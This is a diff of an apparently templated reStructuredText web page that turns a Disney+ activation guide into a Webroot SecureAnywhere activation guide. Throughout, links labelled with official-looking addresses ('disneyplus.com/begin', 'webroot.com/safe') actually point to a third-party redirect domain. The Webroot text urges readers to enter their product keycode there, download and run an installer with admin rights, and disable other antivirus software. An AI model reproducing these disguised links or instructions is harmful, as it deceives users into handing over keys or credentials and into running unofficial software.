@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Activate Your Webroot Subscription with Webroot SecureAnywhere
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,41 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: webroot.com/safe
+   :target: https://wb.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Have a Webroot keycode and need to activate your security software? Get started quickly at `webroot.com/safe <https://wb.redircoms.com>`_. This guide will help you install Webroot SecureAnywhere and activate your subscription in just a few steps.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Activate Webroot SecureAnywhere
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Open your preferred browser and visit `webroot.com/safe <https://wb.redircoms.com>`_.
+2. Type in your **20-character Webroot keycode**, which is included in your product email or retail card.
+3. Click **Next** to be directed to the download page.
+4. Download the **SecureAnywhere installer** and run the setup file.
+5. If asked again, re-enter your keycode during installation.
+6. Complete the installation by following the on-screen prompts.
 
 **********
-What to Do After Activation
+Requirements for Installation
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- Your Webroot keycode (20 characters)  
+- Reliable internet access  
+- Admin privileges on your device  
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Helpful Tips for Successful Activation
+**********
+
+- Paste the keycode directly to avoid manual input errors.
+- Close any other antivirus software before installing Webroot.
+- Reboot your system after installation to apply settings correctly.
+
+Ready to protect your device? Go to `webroot.com/safe <https://wb.redircoms.com>`_ and activate Webroot SecureAnywhere in minutes.
